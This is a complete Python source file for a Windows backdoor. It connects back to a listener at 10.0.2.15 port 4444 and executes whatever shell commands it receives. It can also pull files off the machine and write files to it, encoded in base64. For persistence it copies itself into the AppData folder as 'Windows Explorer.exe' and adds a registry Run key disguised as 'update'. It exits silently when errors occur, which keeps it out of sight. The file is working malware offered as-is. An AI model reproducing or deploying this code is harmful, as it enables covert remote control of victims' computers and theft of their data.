#!/usr/bin/env python

import socket, os
import subprocess, json
import base64
import sys, shutil

class Backdoor:

	def __init__(self, ip, port):
		"""Connect to listener server."""
		self.persistence()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))	

	def persistence(self):
		executable_location = os.environ["appdata"] + "\\Windows Explorer.exe"
		if not os.path.exists(executable_location):
			shutil.copyfile(sys.executable, executable_location)
			subprocess.call('REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + executable_location + '"', shell=True)

	def reliable_send(self, data):
		"""Convert data into JSON (a well-defined) object."""
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())

	def reliable_receive(self):
		"""Convert JSON object back to its original type.
		Receives a byte object from self.connection.recv(1024)."""
		json_data = b""
		while True:
			try:
				json_data += self.connection.recv(1024)
				# json_data += received_data.decode()
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_system_command(self, command):
		"""Method check_output can take a string or a list of strings"""
		return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

	def traverse_file_system(self, path):
		os.chdir(path)
		return "Changing working directory to " + path

	def read_files(self, path):
		"""Read file as binaries with base 64 encoding."""
		with open(path, "rb") as file:
			return base64.b64encode(file.read()) 

	def download_file(self, path, content):
		"""Download a file"""
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "Upload successful!"

	def run(self):
		while True:
			command = self.reliable_receive()
			#print("Received!")

			try:
				if command[0] == "exit":
					self.connection.close()
					# exit() ; Below is a safer way to exit in a Python program: without showing error messages.
					sys.exit()      
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.traverse_file_system(command[1])
				elif command[0] == "download":
					command_result = self.read_files(command[1]).decode()
				elif command[0] == "upload":
					command_result = self.download_file(command[1], command[2])
				else:
					command_result = self.execute_system_command(command).decode()
			except Exception:
				command_result = "Error during command execution."

			# if isinstance(command_result, str):
			self.reliable_send(command_result)
			# else:
				# self.reliable_send(command_result.decode())
			# self.reliable_send(command_result)
try:
	my_backdoor = Backdoor("10.0.2.15", 4444)
	my_backdoor.run()
except Exception:
	sys.exit()